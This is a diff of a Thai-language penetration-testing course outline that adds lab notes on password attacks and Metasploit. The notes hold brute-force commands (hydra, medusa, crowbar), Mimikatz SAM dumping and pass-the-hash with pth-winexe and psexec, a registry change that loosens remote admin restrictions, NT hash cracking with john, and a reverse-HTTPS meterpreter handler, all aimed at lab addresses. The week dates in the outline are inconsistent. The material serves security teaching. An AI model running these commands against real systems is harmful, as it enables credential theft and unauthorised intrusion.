@@ -764,13 +764,76 @@ Two-way methods)
     - HMAC (Hash-based Message Authentication Code) is a specific type of message authentication code (MAC) involving a hash function with a secret cryptographic key
     - Bcrypt is a password hashing function designed by Niels Provos and David Mazières, based on the Blowfish cipher to protect against rainbow table attacks
  
-## Lab
-
 
 - นักศึกษากลุ่มที่ 4 รายงานผลการ Pentest พร้อมอธิบาย Command อย่างละเอียด กลุ่มอื่น ๆ ทำตามและส่ง Flag 
 --- 
 ## Week 9@22 Jan 2023
+- Password Attack
 
+```bash
+# wordlist rockyou
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+
+# medusa attack httpaccess-protected URL (-m DIR:/admin)
+medusa -h 192.168.10.10 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
+
+# Crowbar is a bruteforce tool which support OpenVPN, RDP, SSH and VNC
+sudo apt install crowbar 
+crowbar --help
+# To invoke crowbar, we will specify the protocol (-b), the target server (-s), a username (-u), a wordlist (-C), and the number of threads (-n) 
+crowbar -b rdp -s 192.168.10.10/32 -u admin -C ~/password-file.txt -n 2
+
+# Hydra bruteforce ssh
+hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
+
+# hashid indentification hash funtion
+hashid 5f4dcc3b5aa765d61d8327deb882cf99
+hashid b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86
+```
+
+- Windows Minikatz 
+  - Minikatz x86 dowload [link](https://github.com/ParrotSec/mimikatz)
+```bash
+# run Minikatz as admin
+privilege::debug
+token::elevate
+lsadump::sam
+# หรือ 
+Mimikatz.exe “privilege::debug” “sekurlsa::pth /user:[username] /ntlm:[ntlm hash] /domain:[domainname]” “exit”
+
+
+# ตรวจสอบข้อมูล Users และ Password 
+# User: unicorn
+# Hash NTLM : e19ccf75ee54e86b06a5907af13cef42
+# Pass the hash 
+export SMBHASH=aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42
+pth-winexe -U unicorn //192.168.56.101 cmd
+
+pth-winexe -U unicorn%aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42 //192.168.56.101 cmd
+# IF pth-winexe show ERROR: CreateService failed run command on Windows Administrator 
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\system" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+
+# กรณีใช้ MSF console
+use exploit/windows/smb/psexec
+set SMBPass aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42
+set lhost 192.168.10.10
+set rhosts 192.168.10.20
+run
+```
+- การ Crack hash 
+```bash
+cat hash.txt
+# WDAGUtilityAccount:0c509cca8bcd12a26acf0d1e508cb028
+# Offsec:2892d26cdf84d7a70e2eb3b9f05c425e
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=NT
+
+```
+
+- นักศึกษากลุ่มที่ 5 รายงานผลการ Pentest พร้อมอธิบาย Command อย่างละเอียด กลุ่มอื่น ๆ ทำตามและส่ง Flag 
+  
+--- 
+
+## Week 10@28 Jan 2023
 - Metasploit Framework เป็นโปรแกรม open source ที่ใช้ในการสำรวจและโจมตีเครื่องคอมพิวเตอร์ โดยมีคุณสมบัติต่างๆ รวมถึงการเข้ารหัสและการโจมตีแบบอัตโนมัติ ซึ่งสามารถใช้ในการตรวจสอบความแข็งแกร่งของระบบและการแก้ปัญหาเรื่องความปลอดภัยได้ เป็นโปรแกรมที่สามารถทำงานในรูปแบบ command-line และ graphical user interface (GUI) ซึ่งสามารถใช้ในการตรวจสอบความแข็งแกร่งของระบบเครือข่ายและเครื่องคอมพิวเตอร์ โดยใช้ข้อมูลจากเครื่องตัวเองและฐานข้อมูลของระบบอื่น ๆ อีกด้วย อีกทั้ง Metasploit Framework มีโมดูลหลายตัวที่ใช้ในการโจมตีแบบอัตโนมัติ โดยจะใช้ข้อมูลจากการสำรวจเพื่อเป็นพื้นฐานในการโจมตี ซึ่งสามารถใช้งานได้หลากหลายรูปแบบ เช่น การโจมตีตามโปรโตคอล การโจมตีตามช่องโหว่ และการโจมตีโดยใช้ payload ต่าง ๆ
 - สำหรับกาติดตั้ง Metasploit Framework นั้นจำเป็นจะต้องเปิดใช้งาน Services ของ Postgresql และมีวิธีการติดตั้งดังต่อไปนี้ 
 
@@ -848,7 +911,7 @@ show options
 set rhosts 192.168.10.10
 run
 ```
- - Exploit Modules
+ - Exploit Modules เป็นโมดูลที่ใช้ในการเข้าถึงช่องโหว่ต่างๆ ในเครื่องเป้าหมาย ซึ่งประกอบด้วยโค้ดและวิธีการเข้าถึงช่องโหว่ต่างๆ ซึ่งจะส่ง payload ไปยังเครื่องเป้าหมาย โดยส่วนใหญ่ exploit module จะถูกใช้ร่วมกับ payload module เพื่อส่ง payload ไปยังเป้าหมาย เพื่อดำเนินการควบคุมต่อไป
 ```bash
 # ค้นหาช่องโหว่ที่จะโจมตี 
 search synbreeze
@@ -914,19 +977,39 @@ set LHOST 192.168.10.10
 set RHOST 192.168.10.20 
 generate -f -exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embeded.exe 
 ```
-- Metasploit Exploit Multi Handler 
+- Metasploit Exploit Multi Handler เป็นโมดูลใน Metasploit Framework ที่ใช้ในการรับ payload จาก exploit หรือรับ payload ที่ส่งมาจากตัวเครื่องเป้าหมายเพื่อใช้ในการ post-exploitation ซึ่งจะช่วยให้สามารถติดต่อกลับมายังเครื่องเป้าหมายได้ โดยสามารถรับ payload จากหลายโปรโตคอลได้ เช่น TCP, HTTP, HTTPS และ HTTPS อื่นๆ ซึ่งสามารถปรับแต่งค่าต่างๆ ได้ เช่น ตั้งค่า payload และตั้งค่าการรับส่งข้อมูล ดังนั้น multi/handler จึงเป็นโมดูลที่สำคัญในการใช้งาน Metasploit Framework
 ```bash 
 use multi/handler
 set payload windows/meterpreter/reverse_https
 run 
 ```
 
+- นักศึกษากลุ่มที่ 6 รายงานผลการ Pentest พร้อมอธิบาย Command อย่างละเอียด กลุ่มอื่น ๆ ทำตามและส่ง Flag 
 
-- นักศึกษากลุ่มที่ 5 รายงานผลการ Pentest พร้อมอธิบาย Command อย่างละเอียด กลุ่มอื่น ๆ ทำตามและส่ง Flag 
+--- 
+
+## Week 11@21 Jan 2023
+## Lec
+- Privilege Escalation
+  - Linux: Capabilities, SUIDs/GUIDs, cronjobs, modifiable binaries running as root, out-of-date binaries, known-binary exploits, history files.
+    - [GTFOBins for Linux](https://gtfobins.github.io/)
+  - Windows: Weak service permissions, Unquoted service paths, outdated binaries, scheduled tasks, custom functionality implemented through binaries, known-binary exploits, stored passwords, pass-the-hash.
+    - [LOLBAS for Windows](https://lolbas-project.github.io/)
+
+- นักศึกษากลุ่มที่ 7 รายงานผลการ Pentest พร้อมอธิบาย Command อย่างละเอียด กลุ่มอื่น ๆ ทำตามและส่ง Flag 
   
 --- 
 
-## Week 10@28 Jan 2023
+## Week 12@28 Jan 2023
+## Lec
+## Lab
+
+- นักศึกษากลุ่มที่ 8 รายงานผลการ Pentest พร้อมอธิบาย Command อย่างละเอียด กลุ่มอื่น ๆ ทำตามและส่ง Flag 
+
+  
+--- 
+
+## Week 13@4 Feb 2023
 ## Lec
 - Exploit Development (Buffer Overflows)
 - Buffer Overflows 
@@ -1026,34 +1109,6 @@ FIND Offfset by copy EIP HEX number to find Offset index
 - Finding the Right Mudule
 - Generating Shellcode and Gaining Root
 - Exploit Development
-
-- นักศึกษากลุ่มที่ 6 รายงานผลการ Pentest พร้อมอธิบาย Command อย่างละเอียด กลุ่มอื่น ๆ ทำตามและส่ง Flag 
-
---- 
-
-## Week 11@21 Jan 2023
-## Lec
-- Privilege Escalation
-  - Linux: Capabilities, SUIDs/GUIDs, cronjobs, modifiable binaries running as root, out-of-date binaries, known-binary exploits, history files.
-    - [GTFOBins for Linux](https://gtfobins.github.io/)
-  - Windows: Weak service permissions, Unquoted service paths, outdated binaries, scheduled tasks, custom functionality implemented through binaries, known-binary exploits, stored passwords, pass-the-hash.
-    - [LOLBAS for Windows](https://lolbas-project.github.io/)
-- นักศึกษากลุ่มที่ 7 รายงานผลการ Pentest พร้อมอธิบาย Command อย่างละเอียด กลุ่มอื่น ๆ ทำตามและส่ง Flag 
-  
---- 
-
-## Week 12@28 Jan 2023
-## Lec
-## Lab
-
-- นักศึกษากลุ่มที่ 8 รายงานผลการ Pentest พร้อมอธิบาย Command อย่างละเอียด กลุ่มอื่น ๆ ทำตามและส่ง Flag 
-
-  
---- 
-
-## Week 13@4 Feb 2023
-## Lec
-## Lab
 
 --- 
 
